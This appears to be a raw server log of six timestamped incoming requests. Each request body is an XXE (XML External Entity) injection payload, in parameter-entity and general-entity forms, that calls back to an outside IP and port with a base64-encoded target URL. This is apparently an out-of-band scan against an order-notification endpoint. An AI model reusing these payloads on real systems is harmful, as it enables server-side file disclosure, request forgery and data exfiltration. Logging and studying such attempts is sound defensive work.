03:12:27|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019082403_892?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:12:28|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019082403_892?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:24:13|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019082403_892?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:24:13|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019082403_892?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:33:43|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019082403_892?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:33:43|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019082403_892?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
